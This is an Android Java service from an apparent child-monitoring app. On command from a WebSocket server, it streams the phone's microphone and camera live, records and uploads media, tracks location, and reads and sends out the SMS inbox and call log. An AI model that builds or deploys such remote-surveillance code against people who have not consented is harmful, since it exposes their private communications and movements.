package com.xyz.child;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.room.Room;

import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.DataChannel;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class MonitoringService extends Service {
    private static final String CHANNEL_ID = "monitoring_channel";
    private static final String DEVICE_ID = "child_device_001";
    private static final String SERVER_URL = "ws://192.168.0.102:8080";
    private AppDatabase roomDb;
    private WebSocket webSocket = null;
    private MediaRecorder mediaRecorder;
    private File audioFile;
    private File videoFile;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private PeerConnectionFactory webrtcFactory;
    private PeerConnection peerConnection;
    private AudioTrack audioTrack;
    private VideoTrack videoTrack;
    private VideoCapturer videoCapturer;
    private SurfaceTextureHelper surfaceTextureHelper;
    private boolean isAudioRecording;
    private boolean isVideoRecording;
    private Handler mainHandler;
    private HandlerThread cameraThread;
    private Handler cameraHandler;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        roomDb = Room.databaseBuilder(getApplicationContext(), AppDatabase.class, "app_database").build();
        mainHandler = new Handler(Looper.getMainLooper());
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(getApplicationContext())
                .createInitializationOptions());
        webrtcFactory = PeerConnectionFactory.builder()
            .setOptions(new PeerConnectionFactory.Options())
            .createPeerConnectionFactory();
        setupPeerConnection();
        connectWebSocket();
    }

    private void connectWebSocket() {
        if (webSocket != null) {
            Log.i("WebSocket", "WebSocket already connected, skipping");
            return;
        }
        OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .build();
        Request request = new Request.Builder().url(SERVER_URL).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket ws, Response response) {
                Log.i("WebSocket", "Connected to server: " + response.toString());
                try {
                    JSONObject json = new JSONObject();
                    json.put("clientType", "child");
                    json.put("deviceId", DEVICE_ID);
                    ws.send(json.toString());
                    Log.i("WebSocket", "Sent clientType: child, deviceId: " + DEVICE_ID);
                } catch (Exception e) {
                    Log.e("WebSocket", "Error sending clientType: " + e.getMessage(), e);
                }
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                try {
                    JSONObject json = new JSONObject(text);
                    String type = json.optString("type");
                    if (type.equals("answer")) {
                        mainHandler.post(() -> {
                            try {
                                SessionDescription answer = new SessionDescription(SessionDescription.Type.ANSWER, json.getString("sdp"));
                                peerConnection.setRemoteDescription(new SimpleSdpObserver(), answer);
                                Log.i("WebSocket", "Processed WebRTC answer");
                            } catch (Exception e) {
                                Log.e("WebSocket", "Error processing WebRTC answer: " + e.getMessage(), e);
                            }
                        });
                    } else if (type.equals("candidate")) {
                        mainHandler.post(() -> {
                            try {
                                peerConnection.addIceCandidate(new IceCandidate(
                                    json.getString("id"),
                                    json.getInt("label"),
                                    json.getString("candidate")
                                ));
                                Log.i("WebSocket", "Added ICE candidate");
                            } catch (Exception e) {
                                Log.e("WebSocket", "Error adding ICE candidate: " + e.getMessage(), e);
                            }
                        });
                    } else if (json.has("command")) {
                        String command = json.getString("command");
                        Log.i("MonitoringService", "Received command: " + command);
                        handleCommand(command);
                    }
                } catch (Exception e) {
                    Log.e("WebSocket", "Error processing message: " + e.getMessage(), e);
                }
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                Log.e("WebSocket", "Error: " + t.getMessage() + ", Response: " + (response != null ? response.toString() : "null"), t);
                webSocket = null;
                executor.execute(() -> {
                    try {
                        Thread.sleep(5000);
                        Log.i("WebSocket", "Retrying WebSocket connection...");
                        connectWebSocket();
                    } catch (InterruptedException e) {
                        Log.e("WebSocket", "Reconnect error: " + e.getMessage(), e);
                    }
                });
            }

            @Override
            public void onClosing(WebSocket ws, int code, String reason) {
                Log.i("WebSocket", "Closing: code=" + code + ", reason=" + reason);
                webSocket = null;
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                Log.i("WebSocket", "Closed: code=" + code + ", reason=" + reason);
                webSocket = null;
            }
        });
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> iceServers = new ArrayList<>();
        iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
        peerConnection = webrtcFactory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState newState) {
                Log.i("WebRTC", "Signaling state: " + newState);
            }

            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState newState) {
                Log.i("WebRTC", "ICE connection state: " + newState);
            }

            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState newState) {
                Log.i("WebRTC", "ICE gathering state: " + newState);
            }

            @Override
            public void onIceCandidate(IceCandidate candidate) {
                try {
                    JSONObject json = new JSONObject();
                    json.put("type", "candidate");
                    json.put("id", candidate.sdpMid);
                    json.put("label", candidate.sdpMLineIndex);
                    json.put("candidate", candidate.sdp);
                    webSocket.send(json.toString());
                    Log.i("WebRTC", "Sent ICE candidate");
                } catch (Exception e) {
                    Log.e("WebRTC", "Error sending ICE candidate: " + e.getMessage(), e);
                }
            }

            @Override
            public void onIceCandidatesRemoved(IceCandidate[] candidates) {
                Log.i("WebRTC", "ICE candidates removed");
            }

            @Override
            public void onIceConnectionReceivingChange(boolean receiving) {
                Log.i("WebRTC", "ICE connection receiving change: " + receiving);
            }

            @Override
            public void onAddStream(MediaStream stream) {
                Log.i("WebRTC", "Stream added");
            }

            @Override
            public void onRemoveStream(MediaStream stream) {
                Log.i("WebRTC", "Stream removed");
            }

            @Override
            public void onDataChannel(DataChannel dataChannel) {
                Log.i("WebRTC", "Data channel created");
            }

            @Override
            public void onRenegotiationNeeded() {
                Log.i("WebRTC", "Renegotiation needed");
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Child Monitoring")
            .setContentText("Monitoring is active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
        startForeground(1, notification);
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Monitoring Service Channel",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private void handleCommand(String command) {
        switch (command) {
            case "start_location":
                startLocationTracking();
                break;
            case "start_audio":
                startAudioStreaming();
                break;
            case "stop_audio":
                stopAudioStreaming();
                break;
            case "record_audio":
                recordAudio();
                break;
            case "start_camera":
                startCameraStreaming();
                break;
            case "stop_camera":
                stopCameraStreaming();
                break;
            case "record_camera":
                recordCamera();
                break;
            case "read_sms":
                readSMS();
                break;
            case "read_call_log":
                readCallLog();
                break;
            default:
                Log.w("MonitoringService", "Unknown command: " + command);
        }
    }

    private void startLocationTracking() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w("Location", "Missing ACCESS_FINE_LOCATION permission");
            return;
        }
        mainHandler.post(() -> {
            try {
                LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 10, new LocationListener() {
                    @Override
                    public void onLocationChanged(@NonNull Location location) {
                        String data = "Lat: " + location.getLatitude() + ", Lng: " + location.getLongitude();
                        Log.i("Location", data);
                        saveLog("location", data);
                    }
                });
                Log.i("Location", "Requested location updates");
            } catch (Exception e) {
                Log.e("Location", "Error requesting location updates: " + e.getMessage(), e);
            }
        });
    }

    private void startAudioStreaming() {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w("Audio", "Missing RECORD_AUDIO permission");
            return;
        }
        mainHandler.post(() -> {
            try {
                MediaConstraints audioConstraints = new MediaConstraints();
                AudioSource audioSource = webrtcFactory.createAudioSource(audioConstraints);
                audioTrack = webrtcFactory.createAudioTrack("audioTrack", audioSource);
                peerConnection.addTrack(audioTrack);
                peerConnection.createOffer(new SimpleSdpObserver() {
                    @Override
                    public void onCreateSuccess(SessionDescription sdp) {
                        peerConnection.setLocalDescription(new SimpleSdpObserver(), sdp);
                        try {
                            JSONObject json = new JSONObject();
                            json.put("type", "offer");
                            json.put("sdp", sdp.description);
                            webSocket.send(json.toString());
                            Log.i("WebRTC", "Sent WebRTC offer for audio");
                        } catch (Exception e) {
                            Log.e("WebRTC", "Error sending offer: " + e.getMessage(), e);
                        }
                    }
                }, new MediaConstraints());
                Log.i("Audio", "Started audio stream (WebRTC)");
            } catch (Exception e) {
                Log.e("Audio", "Streaming error: " + e.getMessage(), e);
            }
        });
    }

    private void stopAudioStreaming() {
        mainHandler.post(() -> {
            try {
                if (audioTrack != null) {
                    audioTrack.dispose();
                    audioTrack = null;
                }
                if (peerConnection != null && !peerConnection.getSenders().isEmpty()) {
                    peerConnection.removeTrack(peerConnection.getSenders().get(0));
                }
                Log.i("Audio", "Stopped audio stream (WebRTC)");
                stopAudioRecording();
            } catch (Exception e) {
                Log.e("Audio", "Stop streaming error: " + e.getMessage(), e);
            }
        });
    }

    private void recordAudio() {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w("Audio", "Missing RECORD_AUDIO permission");
            return;
        }
        if (isAudioRecording) {
            Log.i("Audio", "Audio recording already in progress");
            return;
        }
        try {
            File dir = new File(getExternalFilesDir(null), "recordings");
            if (!dir.exists()) dir.mkdirs();
            audioFile = new File(dir, "audio_" + System.currentTimeMillis() + ".opus");
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.OGG);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS);
            mediaRecorder.setAudioEncodingBitRate(32000);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isAudioRecording = true;
            Log.i("Audio", "Recording started: " + audioFile.getAbsolutePath());
        } catch (Exception e) {
            Log.e("Audio", "Recording error: " + e.getMessage(), e);
        }
    }

    private void stopAudioRecording() {
        if (isAudioRecording && mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isAudioRecording = false;
                saveLog("audio", audioFile.getAbsolutePath());
                uploadFile(audioFile, "audio");
                Log.i("Audio", "Recording stopped and saved: " + audioFile.getAbsolutePath());
            } catch (Exception e) {
                Log.e("Audio", "Stop recording error: " + e.getMessage(), e);
            }
        }
    }

    private void uploadFile(File file, String dataType) {
        executor.execute(() -> {
            try {
                byte[] bytes = Files.readAllBytes(file.toPath());
                JSONObject json = new JSONObject();
                json.put("deviceId", DEVICE_ID);
                json.put("dataType", dataType);
                json.put("data", Base64.encodeToString(bytes, Base64.DEFAULT));
                json.put("timestamp", System.currentTimeMillis());
                webSocket.send(json.toString());
                Log.i("Upload", "Uploaded " + dataType + " file: " + file.getAbsolutePath());
            } catch (Exception e) {
                Log.e("Upload", "Error uploading " + dataType + ": " + e.getMessage(), e);
            }
        });
    }

    private void startCameraStreaming() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w("Camera", "Missing CAMERA permission");
            return;
        }
        mainHandler.post(() -> {
            try {
                Camera2Enumerator enumerator = new Camera2Enumerator(MonitoringService.this);
                String[] cameraIds = enumerator.getDeviceNames();
                if (cameraIds.length == 0) {
                    Log.e("Camera", "No cameras available");
                    return;
                }
                String cameraId = cameraIds[0];
                videoCapturer = enumerator.createCapturer(cameraId, null);
                if (videoCapturer == null) {
                    Log.e("Camera", "Failed to create video capturer");
                    return;
                }
                VideoSource videoSource = webrtcFactory.createVideoSource(videoCapturer.isScreencast());
                surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", null);
                videoCapturer.initialize(surfaceTextureHelper, MonitoringService.this, videoSource.getCapturerObserver());
                videoCapturer.startCapture(1280, 720, 30);
                videoTrack = webrtcFactory.createVideoTrack("videoTrack", videoSource);
                peerConnection.addTrack(videoTrack);
                peerConnection.createOffer(new SimpleSdpObserver() {
                    @Override
                    public void onCreateSuccess(SessionDescription sdp) {
                        peerConnection.setLocalDescription(new SimpleSdpObserver(), sdp);
                        try {
                            JSONObject json = new JSONObject();
                            json.put("type", "offer");
                            json.put("sdp", sdp.description);
                            webSocket.send(json.toString());
                            Log.i("WebRTC", "Sent WebRTC offer for video");
                        } catch (Exception e) {
                            Log.e("WebRTC", "Error sending offer: " + e.getMessage(), e);
                        }
                    }
                }, new MediaConstraints());
                Log.i("Camera", "Started camera stream (WebRTC)");
            } catch (Exception e) {
                Log.e("Camera", "Streaming error: " + e.getMessage(), e);
            }
        });
    }

    private void stopCameraStreaming() {
        mainHandler.post(() -> {
            try {
                if (videoCapturer != null) {
                    videoCapturer.stopCapture();
                    videoCapturer.dispose();
                    videoCapturer = null;
                }
                if (videoTrack != null) {
                    videoTrack.dispose();
                    videoTrack = null;
                }
                if (surfaceTextureHelper != null) {
                    surfaceTextureHelper.dispose();
                    surfaceTextureHelper = null;
                }
                if (peerConnection != null && !peerConnection.getSenders().isEmpty()) {
                    peerConnection.removeTrack(peerConnection.getSenders().get(0));
                }
                Log.i("Camera", "Stopped camera stream (WebRTC)");
                stopCameraRecording();
            } catch (Exception e) {
                Log.e("Camera", "Stop streaming error: " + e.getMessage(), e);
            }
        });
    }

    private void recordCamera() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w("Camera", "Missing CAMERA permission");
            return;
        }
        if (isVideoRecording) {
            Log.i("Camera", "Video recording already in progress");
            return;
        }
        cameraHandler.post(() -> {
            try {
                CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
                String[] cameraIds = cameraManager.getCameraIdList();
                if (cameraIds.length == 0) {
                    Log.e("Camera", "No cameras available");
                    return;
                }
                String cameraId = cameraIds[0];
                File dir = new File(getExternalFilesDir(null), "recordings");
                if (!dir.exists()) dir.mkdirs();
                videoFile = new File(dir, "video_" + System.currentTimeMillis() + ".mp4");
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
                mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                mediaRecorder.setVideoEncodingBitRate(1000000);
                mediaRecorder.setVideoFrameRate(30);
                mediaRecorder.setVideoSize(1280, 720);
                mediaRecorder.prepare();
                Surface recorderSurface = mediaRecorder.getSurface();

                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDevice = camera;
                        try {
                            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                            captureBuilder.addTarget(recorderSurface);
                            cameraDevice.createCaptureSession(List.of(recorderSurface), new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        session.setRepeatingRequest(captureBuilder.build(), null, cameraHandler);
                                        mediaRecorder.start();
                                        isVideoRecording = true;
                                        Log.i("Camera", "Video recording started: " + videoFile.getAbsolutePath());
                                    } catch (Exception e) {
                                        Log.e("Camera", "Recording error: " + e.getMessage(), e);
                                    }
                                }

                                @Override
                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                    Log.e("Camera", "Capture session configuration failed");
                                }
                            }, cameraHandler);
                        } catch (Exception e) {
                            Log.e("Camera", "Error setting up capture session: " + e.getMessage(), e);
                        }
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        Log.e("Camera", "Camera disconnected");
                        camera.close();
                        cameraDevice = null;
                    }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        Log.e("Camera", "Camera error: " + error);
                        camera.close();
                        cameraDevice = null;
                    }
                }, cameraHandler);
            } catch (CameraAccessException e) {
                Log.e("Camera", "Camera access error: " + e.getMessage(), e);
            } catch (Exception e) {
                Log.e("Camera", "Recording setup error: " + e.getMessage(), e);
            }
        });
    }

    private void stopCameraRecording() {
        cameraHandler.post(() -> {
            try {
                if (isVideoRecording && mediaRecorder != null) {
                    mediaRecorder.stop();
                    mediaRecorder.release();
                    mediaRecorder = null;
                }
                if (captureSession != null) {
                    captureSession.close();
                    captureSession = null;
                }
                if (cameraDevice != null) {
                    cameraDevice.close();
                    cameraDevice = null;
                }
                if (isVideoRecording) {
                    isVideoRecording = false;
                    saveLog("video", videoFile.getAbsolutePath());
                    uploadFile(videoFile, "video");
                    Log.i("Camera", "Video recording stopped and saved: " + videoFile.getAbsolutePath());
                }
            } catch (Exception e) {
                Log.e("Camera", "Stop recording error: " + e.getMessage(), e);
            }
        });
    }

    private void readSMS() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w("SMS", "Missing READ_SMS permission");
            return;
        }
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    String data = "From: " + address + " Message: " + body;
                    Log.i("SMS", data);
                    saveLog("sms", data);
                }
            } finally {
                cursor.close();
            }
        }
    }

    private void readCallLog() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.w("CallLog", "Missing READ_CALL_LOG permission");
            return;
        }
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String data = "Number: " + number + ", Type: " + type + ", Duration: " + duration;
                    Log.i("CallLog", data);
                    saveLog("call_log", data);
                }
            } finally {
                cursor.close();
            }
        }
    }

    private void saveLog(String dataType, String data) {
        executor.execute(() -> {
            LocalLog log = new LocalLog(DEVICE_ID, dataType, data, System.currentTimeMillis());
            roomDb.logDao().insert(log);
            try {
                JSONObject json = new JSONObject();
                json.put("deviceId", DEVICE_ID);
                json.put("dataType", dataType);
                json.put("data", data);
                json.put("timestamp", log.timestamp);
                webSocket.send(json.toString());
                Log.i("WebSocket", "Sent log: " + dataType + ", data: " + data);
            } catch (Exception e) {
                Log.e("WebSocket", "Error sending log: " + e.getMessage(), e);
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopAudioStreaming();
        stopCameraStreaming();
        stopAudioRecording();
        stopCameraRecording();
        if (peerConnection != null) {
            peerConnection.close();
            peerConnection = null;
        }
        if (webSocket != null) {
            webSocket.close(1000, "Service stopped");
            webSocket = null;
        }
        if (cameraThread != null) {
            cameraThread.quitSafely();
            cameraThread = null;
        }
        executor.shutdown();
    }

    private static class SimpleSdpObserver implements SdpObserver {
        @Override
        public void onCreateSuccess(SessionDescription sessionDescription) {
            Log.i("WebRTC", "SDP created successfully: " + sessionDescription.type);
        }

        @Override
        public void onSetSuccess() {
            Log.i("WebRTC", "SDP set successfully");
        }

        @Override
        public void onCreateFailure(String s) {
            Log.e("WebRTC", "SDP create failure: " + s);
        }

        @Override
        public void onSetFailure(String s) {
            Log.e("WebRTC", "SDP set failure: " + s);
        }
    }
}
